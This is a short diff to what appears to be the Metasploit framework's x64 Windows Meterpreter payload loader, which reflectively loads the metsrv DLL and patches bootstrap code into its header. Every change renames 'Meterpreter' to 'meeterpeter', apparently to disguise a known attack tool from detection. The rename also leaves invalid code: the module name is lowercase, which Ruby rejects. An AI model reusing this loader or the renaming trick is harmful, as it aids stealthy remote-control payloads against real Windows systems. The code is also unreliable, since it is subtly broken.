@@ -8,12 +8,12 @@ module Msf
 
 ###
 #
-# Common module stub for ARCH_X86_64 payloads that make use of Meterpreter.
+# Common module stub for ARCH_X86_64 payloads that make use of meeterpeter.
 #
 ###
 
 
-module Payload::Windows::MeterpreterLoader_x64
+module Payload::Windows::meeterpeterLoader_x64
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
@@ -69,9 +69,9 @@ module Payload::Windows::MeterpreterLoader_x64
     ^
   end
 
-  def stage_meterpreter(stageless=false)
+  def stage_meeterpeter(stageless=false)
     # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll'))
+    dll, offset = load_rdi_dll(MetasploitPayloads.meeterpeter_path('metsrv', 'x64.dll'))
 
     asm_opts = {
       rdi_offset: offset,
@@ -86,7 +86,7 @@ module Payload::Windows::MeterpreterLoader_x64
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
     if bootstrap.length > 62
-      raise RuntimeError, "Meterpreter loader (x64) generated an oversized bootstrap!"
+      raise RuntimeError, "meeterpeter loader (x64) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
